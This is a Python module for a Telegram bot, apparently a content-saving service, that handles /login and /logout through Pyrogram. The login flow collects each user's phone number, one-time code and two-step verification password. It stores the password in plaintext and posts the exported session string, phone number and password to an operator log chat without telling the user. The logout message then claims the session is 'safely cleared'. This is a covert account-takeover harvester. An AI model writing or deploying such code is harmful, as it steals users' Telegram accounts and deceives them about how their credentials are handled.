# Don't Remove Credit Tg - @FLiX_LY
# Ask Doubt on telegram @FLiX_LY

import re, asyncio, traceback
from pyrogram import Client, filters
from pyrogram.enums import ChatAction
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PasswordHashInvalid,
    FloodWait, PhoneNumberBanned
)

from database.db import database
from config import API_ID, API_HASH, LOGS_CHAT_ID, FSUB_INV_LINK
from FLiX.Save import is_member

# /logout
@Client.on_message(filters.command("logout") & filters.private, group=1)
async def logout_acc(client: Client, message: Message):
    user_id = message.from_user.id

    if not await is_member(client, user_id):
        return await client.send_message(
            chat_id=user_id,
            text=f"👋 Hi {message.from_user.mention}, you must join our channel to use this bot.",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("ᴊᴏɪɴ ɴᴏᴡ ❤️", url=FSUB_INV_LINK)]]
            ),
            reply_to_message_id=message.id
        )

    user_data = await database.sessions.find_one({"user_id": user_id})
    if user_data is None or not user_data.get('logged_in', False):
        return await client.send_message(
            chat_id=user_id,
            text="**⚠️ You are not logged in! Please /login first.**",
            reply_to_message_id=message.id
        )

    await database.sessions.update_one(
        {'_id': user_data['_id']},
        {'$set': {'logged_in': False, 'session': None, '2FA': None}}
    )

    await client.send_message(
        chat_id=user_id,
        text="🚪 **Successfully Logged Out!**\n\n🔒 Your session has been safely cleared from our system.\n✅ You're welcome to /login again anytime.",
        reply_to_message_id=message.id
    )


# /login
@Client.on_message(filters.command("login") & filters.private, group=1)
async def login_acc(client: Client, message: Message):
    user_id = message.from_user.id

    # Force Subscription
    if not await is_member(client, user_id):
        return await client.send_message(
            user_id,
            f"👋 Hi {message.from_user.mention}, you must join our channel to use this bot.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join Channel", url=FSUB_INV_LINK)]]),
            reply_to_message_id=message.id
        )

    # Ensure DB Record Exists
    user_data = await database.sessions.find_one({"user_id": user_id})
    if not user_data:
        await database.sessions.insert_one({"user_id": user_id, "logged_in": False, "session": None, "2FA": None})
        user_data = await database.sessions.find_one({"user_id": user_id})

    if user_data.get("logged_in"):
        try:
            temp_client = Client(
                name=f"session_{user_id}",
                session_string=user_data['session'],
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="𝗙𝗟𝗶𝗫 𝗕𝗼𝘁 🚀",
                app_version="ꜱʀʙ 2.0",
                system_version="𝗙𝗟𝗶𝗫 𝗖𝗹𝗼𝘂𝗱 ⚡️",
                lang_code="en"
            )
            await temp_client.connect()
            me = await temp_client.get_me()
            await temp_client.disconnect()

            return await client.send_message(
                user_id,
                f"✅ **You're Already Logged In!**\n\n"
                f"• ɴᴀᴍᴇ: [{me.first_name}](tg://user?id={me.id})\n"
                f"• ᴜꜱᴇʀɴᴀᴍᴇ: @{me.username or 'N/A'}\n"
                f"• ᴜꜱᴇʀ ɪᴅ: `{me.id}`\n\n"
                f"**⚙️ To refresh or switch accounts, use /logout and /login again.**",
                reply_to_message_id=message.id
            )
        except Exception:
            await database.sessions.update_one({"user_id": user_id}, {"$set": {"logged_in": False, "session": None}})

    # Step 1: Ask for phone number
    phone_prompt = (
        "📞 **Let's Get You Logged In!**\n\n"
        "Please share your **phone number** (with country code).\n\n"
        "📌 <i>Example:</i> `+14155552671`\n"
        "🚫 Type /cancel anytime to stop."
    )
    phone_number = await ask_user(
        bot=client,
        user_id=user_id,
        text=phone_prompt,
        reply_to=message.id,
        validate=lambda x: re.fullmatch(r'^\+?[0-9\s\-\(\)]+$', x),
        invalid_text="❌ **Oops! That doesn't look like a valid phone number.**\n\n📌 Example: `+12345678901`"
    )
    if not phone_number:
        return

    phone_number = '+' + re.sub(r'\D', '', phone_number)

    # Create new temp client for login
    temp_client = Client(
        name=f"session_{user_id}",
        api_id=API_ID,
        api_hash=API_HASH,
        device_model="𝗙𝗟𝗶𝗫 𝗕𝗼𝘁 🚀",
        app_version="ꜱʀʙ 2.0",
        system_version="𝗙𝗟𝗶𝗫 𝗖𝗹𝗼𝘂𝗱 ⚡️",
        lang_code="en"
    )
    await temp_client.connect()

    try:
        sent = await client.send_message(user_id, "📨 **Sending OTP...**", reply_to_message_id=message.id)
        code = await temp_client.send_code(phone_number)

        await sent.delete()
    except PhoneNumberInvalid:
        await temp_client.disconnect()
        return await client.send_message(user_id, "❌ **Invalid phone number.**", reply_to_message_id=message.id)
    except PhoneNumberBanned:
        await temp_client.disconnect()
        return await client.send_message(user_id, "❌ **This number is banned.**", reply_to_message_id=message.id)
    except FloodWait as e:
        await temp_client.disconnect()
        return await client.send_message(user_id, f"⏳ **Flood wait:** Please try after `{e.value}` seconds.", reply_to_message_id=message.id)
    except Exception as e:
        await temp_client.disconnect()
        traceback.print_exc()
        return await client.send_message(user_id, f"❌ **Unexpected Error:** `{str(e)}`", reply_to_message_id=message.id)

    # Step 2: Ask for OTP
    while True:
        otp_prompt = (
            f"🔑 **Almost There!**\n\n"
            f"📞 **Phone:** `{phone_number}`\n\n"
            f"Enter the **OTP** you received on Telegram for this number.\n"
            f"💡 <i>Example:</i> `1 2 3 4 5`\n"
            f"🚫 You can cancel anytime with /cancel."
        )
        otp_code = await ask_user(
            bot=client,
            user_id=user_id,
            text=otp_prompt,
            reply_to=message.id,
            validate=lambda x: re.fullmatch(r'\d{5,6}', re.sub(r'\D', '', x)),
            invalid_text="❌ **OTP must contain digits only.**",
            temp_client=temp_client
        )
        if not otp_code:
            return
        otp_code = re.sub(r'\D', '', otp_code)

        try:
            await temp_client.sign_in(phone_number, code.phone_code_hash, otp_code)
            break
        except PhoneCodeInvalid:
            await client.send_message(user_id, "❌ **Invalid OTP. Please try again.**", reply_to_message_id=message.id)
        except PhoneCodeExpired:
            await temp_client.disconnect()
            return await client.send_message(user_id, "⌛ **OTP expired. Please try /login again.**", reply_to_message_id=message.id)
        except SessionPasswordNeeded:
            break

    # Step 3: Handle 2FA
    password = None
    try:
        me = await temp_client.get_me()
    except SessionPasswordNeeded:
        pw_prompt = (
            "🛡️ **Extra Layer of Security!**\n\n"
            "Your account has **2-Step Verification** enabled.\n"
            "Please enter your **Telegram password** to continue.\n\n"
            "🚫 Use /cancel to exit the login process."
        )
        password = await ask_user(
            bot=client,
            user_id=user_id,
            text=pw_prompt,
            reply_to=message.id,
            validate=lambda x: len(x.strip()) >= 3,
            invalid_text="❌ **That password seems too short. Try again.**",
            temp_client=temp_client
        )
        if password is None:
            return
        try:
            await temp_client.check_password(password)
        except PasswordHashInvalid:
            await temp_client.disconnect()
            return await client.send_message(user_id, "❌ **Incorrect 2FA password.**", reply_to_message_id=message.id)

    me = await temp_client.get_me()
    string_session = await temp_client.export_session_string()
    await temp_client.disconnect()

    if len(string_session) < 10:
        return await client.send_message(user_id, "❌ **Generated session string is invalid.**", reply_to_message_id=message.id)

    await database.sessions.update_one(
        {"user_id": user_id},
        {"$set": {"logged_in": True, "session": string_session, "2FA": password}}
    )

    if LOGS_CHAT_ID:
        await client.send_message(
            LOGS_CHAT_ID,
            f"**✨New Login**\n\n"
            f"• **User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
            f"• **User ID**: `{message.from_user.id}`\n"
            f"• **Number:** +{me.phone_number if hasattr(me, 'phone_number') else 'N/A'}\n"
            f"• **Session String** ↓ `{string_session}`\n"
            f"• **2FA Pass:** `{password if password else '❌ Not Set'}`"
        )

    await client.send_message(
        user_id,
        f"🎉**Login Successful!**\n\n"
        f"• ɴᴀᴍᴇ: [{me.first_name}](tg://user?id={me.id})\n"
        f"• ᴜꜱᴇʀɴᴀᴍᴇ: @{me.username or 'N/A'}\n"
        f"• ᴜꜱᴇʀ ɪᴅ: `{me.id}`\n\n"
        f"✅ You're now logged in and ready to go!\n"
        f"⚠️**If you get an AUTH KEY error, use /logout and /login again.**",
        reply_to_message_id=message.id
    )


# Ask function
async def ask_user(
    bot: Client,
    user_id: int,
    text: str,
    timeout: int = 120,
    reply_to: int = None,
    validate: callable = None,
    invalid_text: str = None,
    temp_client: Client = None
) -> str | None:
    while True:
        await bot.send_chat_action(user_id, ChatAction.TYPING)
        prompt = await bot.send_message(user_id, text, reply_to_message_id=reply_to)

        try:
            response = await bot.wait_for_message(user_id, timeout=timeout, filters=filters.user(user_id) & filters.text)
        except asyncio.TimeoutError:
            if temp_client: await temp_client.disconnect()
            await bot.send_message(user_id, "⌛ 𝗧𝗶𝗺𝗲𝗼𝘂𝘁! 𝗬𝗼𝘂 𝗱𝗶𝗱𝗻’𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 /login 𝗮𝗴𝗮𝗶𝗻.", reply_to_message_id=prompt.id)
            return None

        if response.text.strip().lower() == "/cancel":
            cancel_msg = await bot.send_message(user_id, "❌ **Login Process Cancelled**", reply_to_message_id=prompt.id)
            await asyncio.sleep(5)
            try:
                await bot.delete_messages(user_id, [prompt.id, response.id, cancel_msg.id])
            except: pass
            if temp_client: await temp_client.disconnect()
            return None

        user_input = response.text.strip()
        if validate and not validate(user_input):
            if invalid_text:
                await bot.send_message(user_id, invalid_text, reply_to_message_id=response.id)
            try:
                await bot.delete_messages(user_id, [prompt.id, response.id])
            except: pass
            continue

        try:
            await bot.delete_messages(user_id, [prompt.id, response.id])
        except: pass
        return user_input
